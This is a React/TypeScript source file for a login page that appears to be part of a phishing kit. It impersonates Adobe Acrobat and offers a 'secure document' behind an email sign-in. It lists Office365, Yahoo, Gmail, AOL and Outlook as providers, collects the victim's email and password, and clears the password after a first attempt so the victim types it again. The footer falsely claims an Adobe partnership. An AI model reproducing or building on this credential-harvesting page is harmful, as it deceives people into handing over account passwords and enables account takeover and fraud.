import React, { useState } from 'react';
import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  onYahooSelect?: () => void;
  onAolSelect?: () => void;
  onGmailSelect?: () => void;
  onOffice365Select?: () => void;
}

const LoginPage: React.FC<LoginPageProps> = ({ 
  fileName, 
  onLoginSuccess, 
  onLoginError,
  onYahooSelect,
  onAolSelect,
  onGmailSelect,
  onOffice365Select,
}) => {
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  
  const { isLoading, errorMessage, handleFormSubmit, resetLoginState } = useLogin(
    onLoginSuccess,
    onLoginError
  );

  const emailProviders = [
    { name: 'Office365', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
    { name: 'Yahoo', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
    { name: 'Outlook', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
    { name: 'AOL', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
    { name: 'Gmail', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
    { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
  ];

  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: selectedProvider });
    if (result?.isFirstAttempt) {
      setPassword('');
    }
  };

  const handleBackToProviders = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    resetLoginState();
  };

  const handleProviderClick = (providerName: string) => {
    if (providerName === 'Office365' && onOffice365Select) {
      onOffice365Select();
    } else if (providerName === 'Outlook' && onOffice365Select) {
      onOffice365Select();
    } else if (providerName === 'Yahoo' && onYahooSelect) {
      onYahooSelect();
    } else if (providerName === 'AOL' && onAolSelect) {
      onAolSelect();
    } else if (providerName === 'Gmail' && onGmailSelect) {
      onGmailSelect();
    } else {
      setSelectedProvider(providerName);
    }
  };

  const AdobeLogo = () => (
    <img 
      src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/60/Adobe_Acrobat_Reader_icon_%282020%29.svg/640px-Adobe_Acrobat_Reader_icon_%282020%29.svg.png" 
      alt="Adobe Acrobat Reader Logo" 
      className="w-10 h-10"
    />
  );

  return (
    <div 
      className="min-h-screen flex items-center justify-center p-4 font-sans bg-cover bg-center"
      style={{
        backgroundImage: "url('https://images.unsplash.com/photo-1588345921523-c2dcdb7f1dcd?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80')"
      }}
    >
      <div className="w-full max-w-md bg-slate-50 rounded-2xl shadow-xl overflow-hidden border border-slate-200">
        <div className="p-8">
          <div className="flex justify-center mb-6">
            <AdobeLogo />
          </div>
          <h1 className="text-2xl font-bold text-center text-gray-800">
            {!selectedProvider ? 'Sign in to continue' : `Sign in with ${selectedProvider}`}
          </h1>
          <p className="text-center text-gray-500 mt-2 text-sm">
            to access your secure document: <span className="font-medium text-gray-600">{fileName}</span>
          </p>

          <div className="mt-8">
            {!selectedProvider ? (
              // --- Provider Selection UI with New Style ---
              <div>
                <p className="text-center text-sm font-medium text-gray-600 mb-6">Choose your email provider</p>
                <div className="space-y-3">
                  {emailProviders.map((provider) => (
                    <button
                      key={provider.name}
                      onClick={() => handleProviderClick(provider.name)}
                      type="button"
                      className="w-full flex items-center p-3 bg-gradient-to-r from-white to-gray-50 rounded-xl border border-gray-200 hover:from-blue-50 hover:to-indigo-50 hover:border-blue-400 hover:shadow-md transition-all duration-300 group"
                    >
                      <div className="flex items-center justify-center w-12 h-12 bg-white rounded-lg shadow-sm border border-gray-100 group-hover:border-blue-200 transition-colors">
                        <img src={provider.logo} alt={provider.name} className="w-7 h-7 object-contain" />
                      </div>
                      <span className="flex-1 text-left ml-4 text-base font-semibold text-gray-700 group-hover:text-blue-700 transition-colors">
                        {provider.name}
                      </span>
                      <div className="w-2 h-2 rounded-full bg-gray-300 group-hover:bg-blue-500 transition-colors"></div>
                    </button>
                  ))}
                </div>
              </div>
            ) : (
              // --- Login Form UI ---
              <div>
                <button onClick={handleBackToProviders} className="flex items-center gap-2 text-sm text-gray-600 hover:text-gray-900 font-medium mb-6">
                  <ArrowLeft className="w-4 h-4" />
                  Back to providers
                </button>

                <form onSubmit={handleSubmit} className="space-y-5">
                  {errorMessage && (
                    <div className="bg-red-100 text-red-700 p-3 rounded-lg text-sm font-medium text-center border border-red-200">
                      {errorMessage}
                    </div>
                  )}

                  <div>
                    <label className="text-sm font-bold text-gray-700" htmlFor="email">Email Address</label>
                    <div className="relative mt-2">
                      <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                      <input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" required className="w-full pl-10 pr-4 py-3 bg-white border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition" />
                    </div>
                  </div>

                  <div>
                    <label className="text-sm font-bold text-gray-700" htmlFor="password">Password</label>
                    <div className="relative mt-2">
                      <Lock className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                      <input id="password" type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full pl-10 pr-12 py-3 bg-white border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition" />
                      <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700">
                        {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                      </button>
                    </div>
                  </div>

                  <button type="submit" disabled={isLoading || !email || !password} className="w-full flex items-center justify-center py-3 px-4 rounded-lg font-bold text-white bg-blue-600 hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors shadow-sm">
                    {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
                    {isLoading ? 'Verifying...' : 'Sign In'}
                  </button>
                </form>
              </div>
            )}
          </div>
        </div>
        <div className="bg-slate-100 p-4 border-t border-slate-200">
          <p className="text-xs text-gray-500 text-center">© 2025 municipalfilesport. Secured in partnership with Adobe®.</p>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
